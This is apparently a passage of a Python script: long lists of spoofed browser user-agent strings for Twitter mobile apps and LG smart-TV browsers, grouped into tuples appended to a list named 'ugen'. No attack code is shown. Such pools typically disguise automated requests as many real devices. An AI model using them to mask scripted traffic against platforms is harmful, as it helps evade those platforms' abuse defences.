"Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 10; SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S916U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.143 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S918U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; CPH2515 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; 100110027 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SM-N986U1 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21B91 Twitter for iPhone/10.57.1"
"Mozilla/5.0 (Linux; Android 14; SM-A146U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S928U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.143 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SM-A136U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-F926U1 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; SM-G986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; M2101K7BL Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-A256U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-G998U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; moto g play - 2023 Build/T3SGS33.165-46-3-1-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-G998U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 13; moto g play - 2023 Build/T3SGS33.165-46-3-1-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.127 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (iPad; CPU OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H384 Twitter for iPhone/10.57.1"
"Mozilla/5.0 (Linux; Android 10; SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.143 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 55UB830V-ZB; 04.12.36; 0x00000001;); LG NetCast.TV-2013 /04.12.36 (LG, 55UB830V-ZB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49UK6300YVB; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 49UK6300YVB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43UJ651V-ZA; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 43UJ651V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UM7100PLB; 05.40.10; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 43UM7100PLB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/94.0.4606.128 Safari/537.36 LG Browser/8.00.00(LGE; 65UR80006LJ; 03.31.60; 0x00000001; DTV_W23A); webOS.TV-2022; LG NetCast.TV-2013 Compatible (LGE, 65UR80006LJ, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 65SK8500PLA; 05.50.15; 1; DTV_W18H); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 65SK8500PLA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43LH590V-ZA; 05.70.40; 1; DTV_W16R); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 43LH590V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UJ6307-ZA; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 49UJ6307-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UM7450PLA; 05.40.45; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 55UM7450PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49SM9000PLA; 05.40.45; 1; DTV_W19H); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 49SM9000PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 60UH605V-ZC; 05.70.35; 1; DTV_W16P); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 60UH605V-ZC, wired)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H384 Twitter for iPhone/10.51.2"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43LJ594V-ZA; 06.10.35; 1; DTV_W17R); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 43LJ594V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 47LB677V-ZC; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 47LB677V-ZC, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 55UN74006LB; 04.50.52; 0x00000001; DTV_W20P); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 55UN74006LB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 55UJ750V-ZB; 06.10.30; 1; DTV_W17H); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 55UJ750V-ZB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UK6400PLF; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 43UK6400PLF, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 49NANO866NA; 04.50.52; 0x00000001; DTV_W20H); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 49NANO866NA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 55UF8507-ZB; 04.06.25; 1; DTV_W15U); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 55UF8507-ZB, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA660V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA660V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 79UB980V-ZA; 05.06.10; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 79UB980V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 55UN74006LB; 04.50.51; 0x00000001; DTV_W20P); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 55UN74006LB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 43UJ634V-ZD; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 43UJ634V-ZD, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/68.0.3440.106 Safari/537.36 LG Browser/8.00.00(LGE; 49NANO866NA; 04.50.51; 0x00000001; DTV_W20H); webOS.TV-2020; LG NetCast.TV-2013 Compatible (LGE, 49NANO866NA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA669V-ZE; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA669V-ZE, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55B6V-Z; 05.70.40; 1; DTV_W16K); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, OLED55B6V-Z, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 49UF850V-ZB; 04.06.25; 1; DTV_W15U); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 49UF850V-ZB, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA645V-ZC; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA645V-ZC, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49SM8600PLA; 05.30.40; 1; DTV_W19H); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 49SM8600PLA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 32LN655V-ZD; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 32LN655V-ZD, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55C6V-Z; 05.70.30; 1; DTV_W16M); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, OLED55C6V-Z, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UM7450PLA; 05.30.40; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 55UM7450PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 49UK6200PLA; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 49UK6200PLA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UM7100PLB; 05.30.40; 1; DTV_W19P); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 43UM7100PLB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 32LB652V-ZA; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 32LB652V-ZA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LB580V-ZB; 04.04.27; 0x00000001;); LG NetCast.TV-2013 /04.04.27 (LG, 42LB580V-ZB, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML%2C like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 24LF4820-BU; 03.20.14; 1; DTV_W15L); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE%2C 24LF4820-BU%2C wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA620V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA620V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; OLED65B8PLA; 05.50.15; 1; DTV_W18H); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, OLED65B8PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UJ631V-ZA; 06.10.50; 1; DTV_W17P); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, 49UJ631V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 47LB680V-ZD; 05.05.90; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 47LB680V-ZD, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 49LF630V-ZA; 04.06.75; 1; DTV_W15M); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 49LF630V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UH610V-ZB; 05.70.35; 1; DTV_W16P); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 49UH610V-ZB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 28TN525S-PZ; 05.30.40; 1; DTV_W19R); webOS.TV-2019; LG NetCast.TV-2013 Compatible (LGE, 28TN525S-PZ, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 49UH770V-ZA; 05.70.40; 1; DTV_W16K); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 49UH770V-ZA, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 42LA644V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LA644V-ZA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 49UB820V-ZH; 04.12.36; 0x00000001;); LG NetCast.TV-2013 /04.12.36 (LG, 49UB820V-ZH, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 47LA644V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 47LA644V-ZA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/538.2 (KHTML, like Gecko) Large Screen Safari/538.2 LG Browser/7.00.00(LGE; 40LF630V-ZA; 04.06.75; 1; DTV_W15M); webOS.TV-2015; LG NetCast.TV-2013 Compatible (LGE, 40LF630V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; 55UH605V-ZC; 05.70.35; 1; DTV_W16P); webOS.TV-2016; LG NetCast.TV-2013 Compatible (LGE, 55UH605V-ZC, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+3D+SCREEN+TUNER; LGE; 32LA660V-ZA; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 32LA660V-ZA, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/38.0.2125.122 Safari/537.36 LG Browser/8.00.00(LGE; OLED55E7N-Z; 06.10.30; 1; DTV_W17H); webOS.TV-2017; LG NetCast.TV-2013 Compatible (LGE, OLED55E7N-Z, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.41 (KHTML, like Gecko) Large Screen Safari/537.41 LG Browser/7.00.00(LGE; 42LB650V-ZE; 04.41.42; 1); webOS.TV-2014; LG NetCast.TV-2013 Compatible (LGE, 42LB650V-ZE, wired)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LB580V-ZM; 04.04.27; 0x00000001;); LG NetCast.TV-2013 /04.04.27 (LG, 42LB580V-ZM, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 43UK6200PLA; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 43UK6200PLA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UK6300PLB; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 55UK6300PLB, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/87.0.4280.88 Safari/537.36 LG Browser/8.00.00(LGE; OLED55C24LA; 03.33.16; 0x00000001; DTV_W22O); webOS.TV-2022; LG NetCast.TV-2013 Compatible (LGE, OLED55C24LA, wireless)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/87.0.4280.88 Safari/537.36 LG Browser/8.00.00(LGE; 55QNED80UQA; 03.30.74; 0x00000001; DTV_W22H); webOS.TV-2022; LG NetCast.TV-2013 Compatible (LGE, 55QNED80UQA, wireless)"
"Mozilla/5.0 (Unknown; Linux armv7l) AppleWebKit/537.1+ (KHTML, like Gecko) Safari/537.1+ LG Browser/6.00.00(+mouse+SCREEN+TUNER; LGE; 42LN570V-ZE; 04.28.17; 0x00000001;); LG NetCast.TV-2013 /04.28.17 (LG, 42LN570V-ZE, wired)"
"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chr0me/53.0.2785.34 Safari/537.36 LG Browser/8.00.00(LGE; 55UK6400PLF; 05.50.15; 1; DTV_W18A); webOS.TV-2018; LG NetCast.TV-2013 Compatible (LGE, 55UK6400PLF, wired)"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd)
#_______________##____________#
"Mozilla/5.0 (Linux; Android 14; V2170A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SH-53C Build/S7020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S916W Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 7a Build/AP2A.240805.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.40 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 6a Build/AP1A.240305.019.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; PFTM10 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; PGFM10 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-G998B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; RKY-LX3 Build/HONORRKY-L33; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; CPH2513 Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.9 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; A203SO Build/63.2.D.1.59; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-G998U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 6 Pro Build/AP1A.240505.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; ELZ-AN10 Build/HONORELZ-AN10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S908U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/AP2A.240805.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.105 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; moto g(7) plus Build/AP2A.240805.005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; XQ-CQ72 Build/64.2.A.2.191; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; moto g 5G - 2023 Build/U1TPNS34.26-78-3-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; CPH2529 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; TMRV075G Build/UKQ1.230924.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.104 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S911B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; V2314A Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36 TwitterAndroid"
"Mozilla/5.0 (Linux; Android 14; SM-S908U Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.88 Mobile Safari/537.36 TwitterAndroid"
